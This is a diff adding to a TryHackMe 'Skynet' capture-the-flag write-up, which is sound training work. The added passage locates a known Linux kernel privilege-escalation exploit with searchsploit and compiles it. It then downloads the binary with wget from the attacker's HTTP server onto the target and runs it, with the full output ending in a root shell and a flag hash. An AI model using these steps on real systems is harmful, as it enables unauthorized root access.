@@ -262,7 +262,47 @@ sudo su
 root
 
 
+OR $ uname -a
+uname -a
+Linux skynet 4.8.0-58-generic #63~16.04.1-Ubuntu SMP Mon Jun 26 18:08:51 UTC 2017 x86_64 x86_64 x86_64 GNU/Linux
+on my machine 
+searchsploit 4.8.0-58
+Linux Kernel < 4.4.0-83 / < 4.8.0-58 (Ubuntu 14.04/16.04) - Local Privilege Escalat | linux/local/43418.c
+searchsploit -p linux/local/43418.c
+gcc /usr/share/exploitdb/exploits/linux/local/43418.c -o /home/gd/exploit
+
+on target machine
+$cd /tmp
+$wget http://10.6.88.227:8000/exploit
+$chmod +x exploit
+$ ./exploit
+[.] starting
+[.] checking distro and kernel versions
+[.] kernel version '4.8.0-58-generic' detected
+[~] done, versions looks good
+[.] checking SMEP and SMAP
+[~] done, looks good
+[.] setting up namespace sandbox
+[~] done, namespace sandbox set up
+[.] KASLR bypass enabled, getting kernel addr
+[~] done, kernel text:   ffffffff86c00000
+[.] commit_creds:        ffffffff86ca5d20
+[.] prepare_kernel_cred: ffffffff86ca6110
+[.] SMEP bypass enabled, mmapping fake stack
+[~] done, fake stack mmapped
+[.] executing payload ffffffff86c17c55
+[~] done, should be root now
+[.] checking if we got root
+[+] got r00t ^_^
+root@skynet:/tmp#whoami
+root
+
+
 3f0372db24753accc7179a282cd6a949
+
+
+DONE!
+THANKS THM
 
 https://tryhackme.com/room/skynet
 https://blog.tryhackme.com/skynet-writeup/
